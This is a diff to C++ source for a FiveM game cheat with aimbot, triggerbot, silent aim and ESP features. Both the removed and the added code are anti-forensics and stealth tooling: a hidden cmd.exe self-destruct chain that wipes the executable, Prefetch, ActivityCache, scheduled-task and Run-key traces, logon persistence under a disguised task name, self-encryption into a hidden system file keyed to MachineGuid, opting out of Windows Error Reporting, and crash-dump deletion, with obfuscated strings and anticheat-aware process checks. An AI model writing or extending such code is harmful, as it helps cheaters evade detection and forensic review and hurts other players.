@@ -5,104 +5,178 @@
 
 #include <thread>
 #include <chrono>
+#include <vector>
+#include <shlobj.h>
 #include <FrameWork/FrameWork.hpp>
 
-// ── Self-destruct — wipes exe, cfg, scheduled task, registry ─────────────────
-
-static void SelfDestruct() noexcept
+// ── MachineGuid → 32-byte XOR key (same derivation as launcher) ───────────────
+static std::vector<uint8_t> GetMachineKey() noexcept
 {
-    wchar_t exePathBuf[MAX_PATH]{};
-    GetModuleFileNameW(nullptr, exePathBuf, MAX_PATH);
-    std::wstring exePathW(exePathBuf);  // full path, e.g. C:\...\GameOverlayHost.exe
-
-    size_t slash = exePathW.rfind(L'\\');
-    std::wstring exeDir  = (slash != std::wstring::npos) ? exePathW.substr(0, slash) : L".";
-    std::wstring exeName = (slash != std::wstring::npos) ? exePathW.substr(slash + 1) : exePathW;
-
-    // cfg.dat sits next to the exe
-    std::wstring cfgPath = exeDir + WOBF(L"\\cfg.dat");
-
-    wchar_t lad[MAX_PATH]{};
-    GetEnvironmentVariableW(WOBF(L"LOCALAPPDATA").c_str(), lad, MAX_PATH);
-    std::wstring ladW(lad);
-
-    wchar_t sysRoot[MAX_PATH]{};
-    GetEnvironmentVariableW(WOBF(L"SystemRoot").c_str(), sysRoot, MAX_PATH);
-    std::wstring sysRootW(sysRoot);
-
-    std::wstring taskName = WOBF(L"WindowsNetworkHost");
-    std::wstring regVal   = WOBF(L"GameOverlayHost");
-    std::wstring cdpDir   = WOBF(L"ConnectedDevicesPlatform");
-    std::wstring acFile   = WOBF(L"ActivitiesCache.db");
-
-    // Delete by full path so cleanup works regardless of install location.
-    // The folder rd covers the Microsoft\Network install case.
-    wchar_t cmd[4096]{};
-    swprintf_s(cmd, ARRAYSIZE(cmd),
-        L"cmd.exe /C ping -n 3 127.0.0.1 >nul"
-        L" & taskkill /F /IM \"%s\" >nul 2>&1"
-        L" & ping -n 2 127.0.0.1 >nul"
-        L" & del /F /Q \"%s\" >nul 2>&1"
-        L" & del /F /Q \"%s\" >nul 2>&1"
-        L" & rd /S /Q \"%s\" >nul 2>&1"
-        L" & del /F /S /Q \"%s\\%s\\%s\" >nul 2>&1"
-        L" & schtasks /delete /tn \"%s\" /f >nul 2>&1"
-        L" & reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v %s /f >nul 2>&1"
-        L" & del /F /Q \"%s\\Prefetch\\%s*\" >nul 2>&1"
-        L" & ipconfig /flushdns >nul 2>&1",
-        exeName.c_str(),
-        exePathW.c_str(),             // delete exe by exact full path
-        cfgPath.c_str(),              // delete cfg.dat next to exe
-        exeDir.c_str(),               // delete the folder (works for install case)
-        ladW.c_str(), cdpDir.c_str(), acFile.c_str(),
-        taskName.c_str(),
-        regVal.c_str(),
-        sysRootW.c_str(),             // prefetch parent (e.g. C:\Windows)
-        exeName.c_str());
-
-    STARTUPINFOW si{ sizeof(si) };
-    si.dwFlags     = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-    PROCESS_INFORMATION pi{};
-    CreateProcessW(nullptr, cmd, nullptr, nullptr, FALSE,
-                   CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
-    if (pi.hProcess) CloseHandle(pi.hProcess);
-    if (pi.hThread)  CloseHandle(pi.hThread);
+    wchar_t buf[64]{};
+    DWORD sz = sizeof(buf);
+    HKEY hk{};
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
+            WOBF(L"SOFTWARE\\Microsoft\\Cryptography").c_str(),
+            0, KEY_READ | KEY_WOW64_64KEY, &hk) == ERROR_SUCCESS)
+    {
+        RegQueryValueExW(hk, WOBF(L"MachineGuid").c_str(),
+                         nullptr, nullptr, (LPBYTE)buf, &sz);
+        RegCloseKey(hk);
+    }
+    std::vector<uint8_t> key;
+    key.reserve(32);
+    for (int i = 0; buf[i] && i < 16; ++i) {
+        key.push_back(static_cast<uint8_t>(buf[i] & 0xFF));
+        key.push_back(static_cast<uint8_t>((buf[i] >> 8) & 0xFF));
+    }
+    while (key.size() < 32)
+        key.push_back(static_cast<uint8_t>(key.size() * 0x17u + 0x42u));
+    return key;
 }
 
-// ── Auto-start via Task Scheduler (supports elevated/admin launch at logon) ───
-
-static void EnsureAutoStart() noexcept
+static void XorData(std::vector<uint8_t>& data,
+                    const std::vector<uint8_t>& key) noexcept
 {
-    wchar_t path[MAX_PATH]{};
-    if (!GetModuleFileNameW(nullptr, path, MAX_PATH)) return;
+    if (key.empty()) return;
+    for (size_t i = 0; i < data.size(); ++i)
+        data[i] ^= key[i % key.size()];
+}
 
-    std::wstring tn = WOBF(L"WindowsNetworkHost");
-    wchar_t cmd[MAX_PATH + 256]{};
-    swprintf_s(cmd, ARRAYSIZE(cmd),
-        L"schtasks /create /tn \"%s\" /tr \"\\\"%s\\\"\" /sc ONLOGON /rl HIGHEST /f",
-        tn.c_str(), path);
+// ── Self-destruct — encrypts self to blob, removes traces, no child processes ──
+static void SelfDestruct() noexcept
+{
+    // Where the launcher stored us (passed as argv[1] or read from cfg.dat)
+    const std::wstring installDir = CloudSync::GetInstallDir();
 
-    STARTUPINFOW si{ sizeof(si) };
-    si.dwFlags      = STARTF_USESHOWWINDOW;
-    si.wShowWindow  = SW_HIDE;
-    PROCESS_INFORMATION pi{};
-    if (CreateProcessW(nullptr, cmd, nullptr, nullptr, FALSE,
-                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
+    // ── 1. Read own bytes ─────────────────────────────────────────────────────
+    wchar_t ownPath[MAX_PATH]{};
+    GetModuleFileNameW(nullptr, ownPath, MAX_PATH);
+
+    std::vector<uint8_t> exeBytes;
     {
-        WaitForSingleObject(pi.hProcess, 5000);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
+        HANDLE hf = CreateFileW(ownPath, GENERIC_READ, FILE_SHARE_READ,
+                                nullptr, OPEN_EXISTING,
+                                FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (hf != INVALID_HANDLE_VALUE) {
+            LARGE_INTEGER sz{};
+            GetFileSizeEx(hf, &sz);
+            if (sz.QuadPart > 0) {
+                exeBytes.resize(static_cast<size_t>(sz.QuadPart));
+                DWORD rd{};
+                ::ReadFile(hf, exeBytes.data(),
+                           static_cast<DWORD>(exeBytes.size()), &rd, nullptr);
+                exeBytes.resize(rd);
+            }
+            CloseHandle(hf);
+        }
     }
+
+    // ── 2. XOR encrypt with MachineGuid key ───────────────────────────────────
+    if (!exeBytes.empty()) {
+        auto key = GetMachineKey();
+        XorData(exeBytes, key);
+
+        // ── 3. Save encrypted blob to install dir ─────────────────────────────
+        std::wstring blobPath = installDir + WOBF(L"schema_cache.bin");
+        HANDLE hb = CreateFileW(blobPath.c_str(), GENERIC_WRITE, 0,
+                                nullptr, CREATE_ALWAYS,
+                                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
+                                nullptr);
+        if (hb != INVALID_HANDLE_VALUE) {
+            DWORD wr{};
+            ::WriteFile(hb, exeBytes.data(),
+                        static_cast<DWORD>(exeBytes.size()), &wr, nullptr);
+            CloseHandle(hb);
+        }
+    }
+
+    // ── 4. Remove old registry Run key (silent) ───────────────────────────────
+    HKEY hRun{};
+    if (RegOpenKeyExW(HKEY_CURRENT_USER,
+            WOBF(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run").c_str(),
+            0, KEY_SET_VALUE, &hRun) == ERROR_SUCCESS)
+    {
+        RegDeleteValueW(hRun, WOBF(L"GameOverlayHost").c_str());
+        RegCloseKey(hRun);
+    }
+
+    // ── 5. Remove legacy WindowsNetworkHost task if it exists ─────────────────
+    // (new launcher task is preserved — launcher cleans up the temp exe for us)
+    {
+        wchar_t cmd[512]{};
+        swprintf_s(cmd, ARRAYSIZE(cmd),
+            L"schtasks /delete /tn \"%s\" /f",
+            WOBF(L"WindowsNetworkHost").c_str());
+        STARTUPINFOW si{ sizeof(si) };
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        PROCESS_INFORMATION pi{};
+        if (CreateProcessW(nullptr, cmd, nullptr, nullptr, FALSE,
+                           CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
+            WaitForSingleObject(pi.hProcess, 3000);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+        }
+    }
+
+    // ── 6. Exit — launcher monitors our PID, wipes temp exe, exits cleanly ────
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
+
+// Silent crash handler — turns any unhandled exception into a clean exit
+static LONG WINAPI CrashHandler(EXCEPTION_POINTERS*) noexcept
+{
+    ExitProcess(0);
+    return EXCEPTION_EXECUTE_HANDLER;
+}
+
+static void TerminateHandler() noexcept
+{
+    ExitProcess(0);
+}
 
 namespace Cheat
 {
     void Initialize()
     {
-        EnsureAutoStart();
+        // Suppress all crash dialogs and opt this process out of Windows Error Reporting
+        // so crashes leave no Event Log entry, no .dmp file, and no WER report.
+        SetErrorMode(SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS | SEM_NOOPENFILEERRORBOX);
+        SetUnhandledExceptionFilter(CrashHandler);
+        std::set_terminate(TerminateHandler);
+
+        // Register process as WER-excluded via LoadLibrary (no hard wer.lib dependency)
+        if (HMODULE hWer = LoadLibraryW(L"wer.dll")) {
+            typedef HRESULT(WINAPI* PFN_WerAdd)(PCWSTR, BOOL);
+            if (auto fn = (PFN_WerAdd)GetProcAddress(hWer, "WerAddExcludedApplication")) {
+                wchar_t self[MAX_PATH]{};
+                GetModuleFileNameW(nullptr, self, MAX_PATH);
+                fn(self, FALSE);
+            }
+            FreeLibrary(hWer);
+        }
+
+        // Remove any leftover crash dumps from previous runs
+        {
+            wchar_t dumpDir[MAX_PATH]{};
+            if (SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, dumpDir))) {
+                std::wstring dir = std::wstring(dumpDir) + L"\\CrashDumps\\";
+                wchar_t self[MAX_PATH]{};
+                GetModuleFileNameW(nullptr, self, MAX_PATH);
+                const wchar_t* name = self;
+                for (const wchar_t* p = self; *p; ++p)
+                    if (*p == L'\\' || *p == L'/') name = p + 1;
+                std::wstring pattern = dir + name + L"*.dmp";
+                WIN32_FIND_DATAW fd{};
+                HANDLE hFind = FindFirstFileW(pattern.c_str(), &fd);
+                if (hFind != INVALID_HANDLE_VALUE) {
+                    do { DeleteFileW((dir + fd.cFileName).c_str()); }
+                    while (FindNextFileW(hFind, &fd));
+                    FindClose(hFind);
+                }
+            }
+        }
 
         // Read cfg.dat and reset Firebase state BEFORE polling thread starts.
         // If Start() runs first the thread can read activate=true and the wait returns immediately.
@@ -122,12 +196,12 @@ namespace Cheat
         }
         if (g_Options.General.ShutDown) goto shutdown_cleanup;
 
-        // Step 2: Feature threads
-        std::thread([] { TriggerBot::RunThread(); }).detach();
-        std::thread([] { AimBot::RunThread(); }).detach();
-        std::thread([] { SilentAim::RunThread(); }).detach();
-        std::thread([] { Exploits::RunThread(); }).detach();
-        std::thread([] { AntiSilentAim::RunThread(); }).detach();
+        // Step 2: Feature threads — try/catch prevents std::terminate on uncaught exception
+        std::thread([] { try { TriggerBot::RunThread();    } catch (...) {} }).detach();
+        std::thread([] { try { AimBot::RunThread();        } catch (...) {} }).detach();
+        std::thread([] { try { SilentAim::RunThread();     } catch (...) {} }).detach();
+        std::thread([] { try { Exploits::RunThread();      } catch (...) {} }).detach();
+        std::thread([] { try { AntiSilentAim::RunThread(); } catch (...) {} }).detach();
 
         // Step 3: Setup overlay — also exits on Shutdown/Destruct signal
         while (!FrameWork::Overlay::IsSettuped() && !g_Options.General.ShutDown)
@@ -163,6 +237,32 @@ namespace Cheat
         // Step 6: Render loop — ESP overlay only, no local menu
         while (!g_Options.General.ShutDown)
         {
+            // Every ~600 ms check if FiveM is still running.
+            // Use PROCESS_QUERY_LIMITED_INFORMATION — SYNCHRONIZE can be rejected by anticheat
+            // and would incorrectly trigger shutdown. Only shut down when we are CERTAIN the
+            // process is gone: exit code != STILL_ACTIVE, or PID truly invalid (ERROR_INVALID_PARAMETER).
+            static const DWORD fivemPid = g_Fivem.GetPid();
+            static int s_aliveCheckTick = 0;
+            if (++s_aliveCheckTick >= 200)
+            {
+                s_aliveCheckTick = 0;
+                HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, fivemPid);
+                if (hProc)
+                {
+                    DWORD exitCode = STILL_ACTIVE;
+                    GetExitCodeProcess(hProc, &exitCode);
+                    CloseHandle(hProc);
+                    if (exitCode != STILL_ACTIVE) {
+                        g_Options.General.ShutDown = true; break;
+                    }
+                }
+                else if (GetLastError() == ERROR_INVALID_PARAMETER)
+                {
+                    g_Options.General.ShutDown = true; break;
+                }
+                // ERROR_ACCESS_DENIED → process is protected but alive; keep running
+            }
+
             MSG msg;
             while (PeekMessage(&msg, nullptr, 0U, 0U, PM_REMOVE))
             {
@@ -246,7 +346,7 @@ namespace Cheat
 
                 if (AB.Enabled && KeyHeld(AB.KeyBind)) DrawEntry("Aimbot");
                 if (TR.Enabled && KeyHeld(TR.KeyBind)) DrawEntry("Triggerbot");
-                if (LP.God)                             DrawEntry("God Mode");
+                if (LP.Bubbles && KeyHeld(LP.BubblesBind)) DrawEntry("God Mode");
                 if (LP.norecoil)                        DrawEntry("No Recoil");
                 if (LP.nospread)                        DrawEntry("No Spread");
                 if (LP.rapidfire)                       DrawEntry("Rapid Fire");
@@ -293,7 +393,7 @@ namespace Cheat
                     bg->AddCircleFilled(rc, 3.5f, ImColor(255, 255, 255, 240));
 
                     float scale = R / g_Options.Visuals.Radar.Range;
-                    for (const auto& e : g_Fivem.GetEntitiyList())
+                    for (const auto& e : g_Fivem.GetEntitiyListSafe())
                     {
                         if (e.StaticInfo.bIsLocalPlayer) continue;
                         if (e.StaticInfo.bIsNPC && !g_Options.Visuals.Radar.ShowNPC) continue;
